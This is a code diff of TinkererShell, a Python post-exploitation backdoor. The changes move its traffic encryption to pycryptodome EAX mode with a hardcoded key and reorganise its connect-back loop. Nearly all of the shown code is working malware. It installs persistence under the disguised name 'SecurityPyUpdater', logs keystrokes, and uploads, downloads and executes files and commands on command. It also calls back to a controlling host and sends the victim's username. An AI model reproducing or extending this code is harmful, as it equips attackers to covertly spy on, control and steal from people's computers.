@@ -2,24 +2,27 @@
 # -*- coding: utf-8 -*-
 """TinkererShell bot, a simple agent for post exploitation.\n"""
 
+
 # Written By Ananke: https://github.com/4n4nk3
-import base64
+import json
 import os
+import shutil
+import smtplib
 import socket
 import subprocess
 import sys
 import tempfile
 import threading
 import time
-import shutil
-from filecmp import cmp
-from tendo import singleton
-from pathlib import Path
-# pycrypto
-from Crypto.Cipher import AES
-# mailer
-import smtplib
+from base64 import b64encode, b64decode
 from email.mime.text import MIMEText
+from filecmp import cmp
+from pathlib import Path
+
+# pycryptodome
+from Crypto.Cipher import AES
+# tendo
+from tendo import singleton
 
 # Importing module for autostart written by Jonas Wagner
 # http://29a.ch/2009/3/17/autostart-autorun-with-python
@@ -31,10 +34,8 @@ mailactivation = False
 persistenceactivation = False
 
 # Global variables
-global platform
 global thr_block
 global thr_exit
-global username
 
 # I understand on which system I am and then I import the corrects modules for the keylogger
 if os.name == 'nt':
@@ -76,7 +77,8 @@ def persistence_install() -> bool:
         else:
             # Give executable permission to file
             try:
-                subprocess.Popen('chmod 700 ' + target_to_autostart, shell=True, stdout=subprocess.PIPE,
+                subprocess.Popen('chmod 700 ' + target_to_autostart, shell=True,
+                                 stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE,
                                  stdin=subprocess.PIPE)
             except Exception as exception:
@@ -84,8 +86,7 @@ def persistence_install() -> bool:
                 return False
         autorun.add('SecurityPyUpdater', target_to_autostart)
         return True
-    else:
-        return False
+    return False
 
 
 def persistence_remove() -> bool:
@@ -93,16 +94,14 @@ def persistence_remove() -> bool:
     if autorun.exists('SecurityPyUpdater'):
         autorun.remove('SecurityPyUpdater')
         return True
-    else:
-        return False
+    return False
 
 
 def persistence_status() -> bool:
     """Check if persistence is installed.\n"""
     if autorun.exists('SecurityPyUpdater'):
         return True
-    else:
-        return False
+    return False
 
 
 # Persistence !!!
@@ -116,26 +115,26 @@ me = singleton.SingleInstance()
 def receiver() -> str:
     """Receive data from master, decrypt it and return it.\n"""
     lengthcrypt = s.recv(1024)
-    expected_length = int(DecodeAES(cipher, lengthcrypt))
+    expected_length = int(decode_aes(lengthcrypt))
     encrypted_received_data = ''
     while len(encrypted_received_data) < expected_length:
         encrypted_received_data += s.recv(1024).decode('utf-8')
-    return DecodeAES(cipher, encrypted_received_data)
+    return decode_aes(encrypted_received_data)
 
 
 def sender(data_to_send: str) -> None:
     """Encrypt data and send it to master.\n"""
     # If data = 0 I will set an arbitrary string so sending operation will not be NULL
-    if len(data_to_send) == 0:
+    if not data_to_send:
         data_to_send = 'Ok (no output)\n'
     # Crypting data, obtaining their length and then typecasting it to data_to_send string and crypting it
-    encoded = EncodeAES(cipher, data_to_send)
+    encoded = encode_aes(data_to_send)
     length = str(len(encoded))
-    length_crypt = EncodeAES(cipher, length)
+    length_crypt = encode_aes(length)
     # Sending the length and wait. Then send data
-    s.send(length_crypt)
+    s.send(bytes(length_crypt, 'utf-8'))
     time.sleep(1)
-    s.send(encoded)
+    s.send(bytes(encoded, 'utf-8'))
 
 
 def command_executor(command: str):
@@ -242,7 +241,7 @@ def keylogs_download(keylogfile_dow: str):
     """Send keylogged data to the master and delete it from victim host.\n"""
     try:
         with open(keylogfile_dow, 'rb') as f_kd:
-            keylogged_data = base64.b64decode(f_kd.read()).decode('utf-8')
+            keylogged_data = b64decode(f_kd.read()).decode('utf-8')
         sender(keylogged_data + '\n')
     except Exception as exception:
         sender('reachedexcept')
@@ -267,7 +266,7 @@ def downloader():
     except Exception as exception:
         sender('reachedexcept')
         a = str(exception)
-    sender(a)
+    sender(a.decode('utf-8'))
 
 
 def uploader():
@@ -275,19 +274,42 @@ def uploader():
     filename = os.path.normcase(receiver())
     uploaded_data: str = receiver()
     if uploaded_data != 'reachedexcept':
-        if os.access(filename, os.W_OK):
-            try:
-                # Writing file in binary form
-                filewrite = open(filename, 'wb')
-                filewrite.write(bytes(uploaded_data))
-                filewrite.close()
-                sender('File saved in ' + filename + '\n')
-            except Exception as exception:
-                sender(str(exception))
-        else:
-            sender('Operation aborted! Cannot write to target file!\n')
+        try:
+            # Writing file in binary form
+            filewrite = open(filename, 'wb')
+            filewrite.write(bytes(uploaded_data, 'utf-8'))
+            filewrite.close()
+            sender('File saved in ' + filename + '\n')
+        except Exception as exception:
+            sender(str(exception))
     else:
         sender('Operation aborted\n')
+
+
+def encode_aes(text_input):
+    """Encode a string and output an json in string form.\n"""
+    secret = b'4n4nk353hlli5w311d0n3andI1ik3it!'
+    cipher = AES.new(secret, AES.MODE_EAX)
+    ciphertext, tag = cipher.encrypt_and_digest(bytes(text_input, 'utf-8'))
+    lista = [ciphertext, tag, cipher.nonce]
+    json_k = ['ciphertext', 'tag', 'nonce']
+    json_v = [b64encode(x).decode('utf-8') for x in lista]
+    return json.dumps(dict(zip(json_k, json_v)))
+
+
+def decode_aes(json_input):
+    """Decode a string in json form and output a string.\n"""
+    try:
+        b64 = json.loads(json_input)
+        json_k = ['ciphertext', 'tag', 'nonce']
+        jv = {k: b64decode(b64[k]) for k in json_k}
+        secret = b'4n4nk353hlli5w311d0n3andI1ik3it!'
+        cipher = AES.new(secret, AES.MODE_EAX, nonce=jv['nonce'])
+        cleared = (cipher.decrypt_and_verify(jv['ciphertext'], jv['tag'])).decode('utf-8')
+        return cleared
+    except Exception as exception:
+        print(exception)
+        print("Incorrect decryption")
 
 
 # =================================================================================================
@@ -302,29 +324,29 @@ def keylogger(fd_temp_key: int, keylogfile_key: str):
             if event.Ascii != 0 or 8:
                 # Use base64 and not an encryption just for performance
                 with open(keylogfile_key, 'r+b') as f_key:
-                    data_decoded = base64.b64decode(f_key.read()).decode('utf-8')
+                    data_decoded = b64decode(f_key.read()).decode('utf-8')
                     f_key.seek(0)
                     if event.Key == 'space':
                         data_decoded += ' '
-                        f_key.write(base64.b64encode(data_decoded.encode('utf-8')))
+                        f_key.write(b64encode(data_decoded.encode('utf-8')))
                     elif event.Key == 'BackSpace':
                         data_decoded += '[BackSpace]'
-                        f_key.write(base64.b64encode(data_decoded.encode('utf-8')))
+                        f_key.write(b64encode(data_decoded.encode('utf-8')))
                     elif event.Key == 'Return':
                         data_decoded += '[Enter]'
-                        f_key.write(base64.b64encode(data_decoded.encode('utf-8')))
+                        f_key.write(b64encode(data_decoded.encode('utf-8')))
                     elif event.Key == 'Shift_L':
                         data_decoded += '[Shift_L]'
-                        f_key.write(base64.b64encode(data_decoded.encode('utf-8')))
+                        f_key.write(b64encode(data_decoded.encode('utf-8')))
                     elif event.Key == 'Shift_R':
                         data_decoded += '[Shift_R]'
-                        f_key.write(base64.b64encode(data_decoded.encode('utf-8')))
+                        f_key.write(b64encode(data_decoded.encode('utf-8')))
                     elif event.Key == 'Tab':
                         data_decoded += '[Tab]'
-                        f_key.write(base64.b64encode(data_decoded.encode('utf-8')))
+                        f_key.write(b64encode(data_decoded.encode('utf-8')))
                     else:
                         data_decoded += event.Key
-                        f_key.write(base64.b64encode(data_decoded.encode('utf-8')))
+                        f_key.write(b64encode(data_decoded.encode('utf-8')))
         if thr_exit.isSet():
             os.close(fd_temp_key)
             sys.exit(0)
@@ -388,10 +410,6 @@ def backdoor(mailactivation_bd: bool, keylogfile_bd: str):
 
     # Defining global the variables that I need to use in many different functions
     global s
-    global cipher
-    global EncodeAES
-    global DecodeAES
-    global username
 
     # Creating the socket
     first_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -411,66 +429,57 @@ def backdoor(mailactivation_bd: bool, keylogfile_bd: str):
     f_bd.write(buffer)
     f_bd.close()
 
-    # Setting parameters required for crypting communications
-    block_size = 32
-    padding = '{'
-    pad = lambda y: y + (block_size - len(y) % block_size) * padding
-    EncodeAES = lambda c, y: base64.b64encode(c.encrypt(pad(y)))
-    DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).decode('utf-8').rstrip(padding)
-    # Setting password for crypting packets
-    secret = '4n4nk353hlli5w311d0n3andI1ik3it!'
-    cipher = AES.new(secret)
-    del secret
-
     # Connection loop
-    while 1:
-        try:
-            # Connecting to the client
-            first_s.connect((host, port))
-            # Sending information relatives to the infected system
-            proc = subprocess.run(['whoami'], check=True, stdout=subprocess.PIPE, universal_newlines=True)
-            username = proc.stdout.split()[0]
-            # First time i send username
-            encoded = EncodeAES(cipher, username)
-            length = str(len(encoded))
-            length_crypt = EncodeAES(cipher, length)
-            # Sending the length and wait. Then send data
-            first_s.send(length_crypt)
-            time.sleep(1)
-            first_s.send(encoded)
-            print('Connection successful')
-            lengthcrypt = first_s.recv(1024)
-            expected_length = int(DecodeAES(cipher, lengthcrypt))
-            encrypted_received_data = ''
-            while len(encrypted_received_data) < expected_length:
-                encrypted_received_data += first_s.recv(1024).decode('utf-8')
-            new_port = int(DecodeAES(cipher, encrypted_received_data))
-            print('New port is gonna be {}'.format(new_port))
-            time.sleep(5)
-            first_s.close()
-            # Connecting to the client on the new port
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((host, new_port))
-            # Sending information relatives to the infected system
-            encoded = EncodeAES(cipher, username)
-            length = str(len(encoded))
-            length_crypt = EncodeAES(cipher, length)
-            # Sending the length and wait. Then send data
-            s.send(length_crypt)
-            time.sleep(1)
-            s.send(encoded)
-            break
-        # If i cannot connect I wait 2 minutes and then I retry
-        except Exception as exception:
-            print(exception)
-            print('>>> New attempt in 2 min')
-            time.sleep(30)
-            print('>>> New attempt in 1,5 min')
-            time.sleep(30)
-            print('>>> New attempt in 1 min')
-            time.sleep(30)
-            print('>>> New attempt in 30 sec')
-            time.sleep(30)
+    while True:
+        while True:
+            try:
+                # Connecting to the client
+                first_s.connect((host, port))
+                break
+                # If i cannot connect I wait 2 minutes and then I retry
+            except Exception as exception:
+                print(exception)
+                print('>>> New attempt in 2 min')
+                time.sleep(30)
+                print('>>> New attempt in 1,5 min')
+                time.sleep(30)
+                print('>>> New attempt in 1 min')
+                time.sleep(30)
+                print('>>> New attempt in 30 sec')
+                time.sleep(30)
+        # Sending information relatives to the infected system
+        proc = subprocess.run(['whoami'], check=True, stdout=subprocess.PIPE, universal_newlines=True)
+        username = proc.stdout.split()[0]
+        # First time i send username
+        encoded = encode_aes(username)
+        length = str(len(encoded))
+        length_crypt = encode_aes(length)
+        # Sending the length and wait. Then send data
+        first_s.send(bytes(length_crypt, 'utf-8'))
+        time.sleep(1)
+        first_s.send(bytes(encoded, 'utf-8'))
+        print('Connection successful')
+        lengthcrypt = first_s.recv(1024).decode('utf-8')
+        expected_length = int(str(decode_aes(lengthcrypt)))
+        encrypted_received_data = ''
+        while len(encrypted_received_data) < expected_length:
+            encrypted_received_data += first_s.recv(1024).decode('utf-8')
+        new_port = int(decode_aes(encrypted_received_data))
+        print('New port is gonna be {}'.format(new_port))
+        time.sleep(5)
+        first_s.close()
+        # Connecting to the client on the new port
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, new_port))
+        # Sending information relatives to the infected system
+        encoded = encode_aes(username)
+        length = str(len(encoded))
+        length_crypt = encode_aes(length)
+        # Sending the length and wait. Then send data
+        s.send(bytes(length_crypt, 'utf-8'))
+        time.sleep(1)
+        s.send(bytes(encoded, 'utf-8'))
+        break
 
     # Commands loop
     while 1:
